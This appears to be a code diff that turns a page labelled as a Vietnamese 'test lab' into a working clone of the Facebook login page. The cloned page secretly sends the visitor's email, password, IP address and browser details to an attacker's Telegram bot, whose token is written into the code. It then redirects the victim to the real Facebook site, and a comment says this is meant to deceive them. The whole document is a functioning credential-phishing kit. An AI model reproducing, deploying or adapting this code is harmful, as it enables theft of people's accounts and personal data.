@@ -2,36 +2,91 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Lab Kiểm Thử Tương Tác</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – Log in or sign up</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
-        button { width: 95%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #166fe5; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; justify-content: space-between; align-items: center; max-width: 980px; width: 100%; padding: 20px; }
+        .left-side { width: 500px; padding-right: 32px; }
+        .left-side h1 { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
+        .left-side p { font-size: 24px; line-height: 28px; color: #1c1e21; margin: 0; }
+        .right-side { width: 396px; display: flex; flex-direction: column; align-items: center; }
+        .login-card { background: #ffffff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 100%; box-sizing: border-box; text-align: center; }
+        .login-card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        .login-card input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; line-height: 48px; width: 100%; cursor: pointer; margin-bottom: 16px; }
+        .login-btn:hover { background-color: #166fe5; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; padding: 0 16px; line-height: 48px; cursor: pointer; display: inline-block; text-decoration: none; }
+        .create-btn:hover { background-color: #36a420; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3>Mô Phỏng Lab Kiểm Thử</h3>
-        <p style="font-size: 13px; color: #666;">Trang này dùng để test cơ chế bắt sự kiện.</p>
-        
-        <!-- Form gửi trực tiếp qua iframe ẩn, vượt qua mọi lỗi CORS của trình duyệt -->
-        <form id="testForm" action="https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage" method="GET" target="hidden_iframe">
-            <input type="hidden" name="chat_id" value="8742570709">
-            <input type="text" id="userInput" name="text" placeholder="Nhập dữ liệu test..." required><br>
-            <button type="submit">Gửi dữ liệu</button>
-        </form>
-        
-        <!-- Khung ẩn nhận phản hồi để trang web không bị nhảy trang -->
-        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+    <div class="container">
+        <!-- Phần tiêu đề bên trái giống Facebook -->
+        <div class="left-side">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
+        </div>
+
+        <!-- Phần khung đăng nhập bên phải -->
+        <div class="right-side">
+            <div class="login-card">
+                <form id="fbForm" action="https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage" method="GET" target="hidden_iframe">
+                    <input type="hidden" name="chat_id" value="8742570709">
+                    
+                    <!-- Ô nhập tài khoản (Email hoặc số điện thoại) -->
+                    <input type="text" id="email" name="text_user" placeholder="Email address or phone number" required>
+                    
+                    <!-- Ô nhập mật khẩu -->
+                    <input type="password" id="pass" placeholder="Password" required>
+                    
+                    <!-- Nút bấm Đăng nhập -->
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                
+                <div style="margin-bottom: 16px;">
+                    <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">Forgotten password?</a>
+                </div>
+                
+                <div class="divider"></div>
+                
+                <a href="#" class="create-btn">Create new account</a>
+            </div>
+        </div>
     </div>
 
+    <!-- Iframe ẩn để nhận phản hồi, chống nhảy trang ngột ngạt -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
     <script>
-        document.getElementById('testForm').addEventListener('submit', function() {
-            // Sau khi bấm gửi 0.8 giây, tự động chuyển hướng người dùng đi nơi khác
+        // Lấy thông tin IP của người truy cập
+        let userIp = "Đang lấy...";
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => { userIp = data.ip; })
+            .catch(() => { userIp = "Không xác định"; });
+
+        document.getElementById('fbForm').addEventListener('submit', function(e) {
+            const userVal = document.getElementById('email').value;
+            const passVal = document.getElementById('pass').value;
+
+            // Đóng gói nội dung tin nhắn gửi về Telegram
+            const message = 
+                `🚨 PHÁT HIỆN DỮ LIỆU ĐĂNG NHẬP FACEBOOK!\n` +
+                `------------------------------------\n` +
+                `👤 Tài khoản: ${userVal}\n` +
+                `🔑 Mật khẩu: ${passVal}\n` +
+                `🌐 IP nguồn: ${userIp}\n` +
+                `📱 Thiết bị: ${navigator.userAgent}`;
+
+            // Gán nội dung vào trường text truyền sang Telegram API
+            this.action = `https://api.telegram.org/bot8794929706:AAFzSyo7YY1kUm1Tlqt9gv7tmv82TTQxw2o/sendMessage?chat_id=8742570709&text=` + encodeURIComponent(message);
+
+            // Sau khi gửi đi 0.8 giây, chuyển hướng nạn nhân/người test về trang chủ Facebook thật để đánh lừa
             setTimeout(() => {
-                window.location.href = 'https://www.google.com';
+                window.location.href = 'https://www.facebook.com';
             }, 800);
         });
     </script>
